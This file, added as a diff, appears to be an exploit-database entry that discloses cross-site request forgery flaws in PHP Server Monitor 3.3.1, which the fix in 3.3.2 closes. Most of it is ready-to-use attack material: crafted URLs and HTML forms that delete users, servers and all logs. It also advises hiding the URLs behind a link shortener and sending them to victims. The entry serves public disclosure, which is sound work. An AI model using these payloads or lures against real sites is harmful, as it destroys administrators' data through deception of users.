@@ -1,0 +1,77 @@
+# Exploit Title: PHP Server Monitor 3.3.1 - Cross-Site Request Forgery
+# Exploit Author: Javier Olmedo
+# Website: https://www.sidertia.com
+# Date: 2018-11-28
+# Google Dork: N/A
+# Vendor: https://www.phpservermonitor.org/
+# Software Link: https://github.com/phpservermon/phpservermon/releases/tag/v3.3.1
+# Affected Version: 3.3.1 and possibly before
+# Patched Version: update to 3.3.2
+# Category: Web Application
+# Platform: Windows & Ubuntu
+# Tested on: Win10x64 & Kali Linux
+# CVE: N/A
+# References:
+# https://github.com/phpservermon/phpservermon/issues/670
+# https://www.sidertia.com/Home/Community/Blog/2018/11/28/Corregidas-las-vulnerabilidades-CSRF-descubiertas-en-PHP-Server-Monitor
+   
+# 1. Technical Description:
+# PHP Server Monitor version 3.3.1 and possibly before are affected by multiple
+# Cross-Site Request Forgery vulnerability, an attacker could remove users, logs,
+# and servers.
+ 
+# 2.1 Proof Of Concept (Delete User):
+
+(Method 1)
+Use Google URL Shortener (or similar) to shorten the next url (http://[PATH]/?&mod=user&action=delete&id=[ID]) and send it to the victim.
+
+(Method 2)
+Use next form and send it tho the victim.
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://[PATH]/">
+      <input type="hidden" name="mod" value="user" />
+      <input type="hidden" name="action" value="delete" />
+      <input type="hidden" name="id" value="[ID]" />
+      <input type="submit" value="Delete User" />
+    </form>
+  </body>
+</html>
+
+# 2.2 Proof Of Concept (Delete Server):
+
+(Method 1)
+Use Google URL Shortener (or similar) to shorten the next url (http://[PATH]/?&mod=server&action=delete&id=[ID]) and send it to the victim.
+
+(Method 2)
+Use next form and send it tho the victim.
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://[PATH]/">
+      <input type="hidden" name="mod" value="server" />
+      <input type="hidden" name="action" value="delete" />
+      <input type="hidden" name="id" value="[ID]" />
+      <input type="submit" value="Delete Server" />
+    </form>
+  </body>
+</html>
+
+# 2.3 Proof Of Concept (Delete All Logs):
+
+(Method 1)
+Use Google URL Shortener (or similar) to shorten the next url (http://[PATH]/?&mod=server_log&action=delete) and send it to the victim.
+
+(Method 2)
+Use next form and send it tho the victim.
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://[PATH]/">
+      <input type="hidden" name="mod" value="server&#95;log" />
+      <input type="hidden" name="action" value="delete" />
+      <input type="submit" value="Delete All Logs" />
+    </form>
+  </body>
+</html>
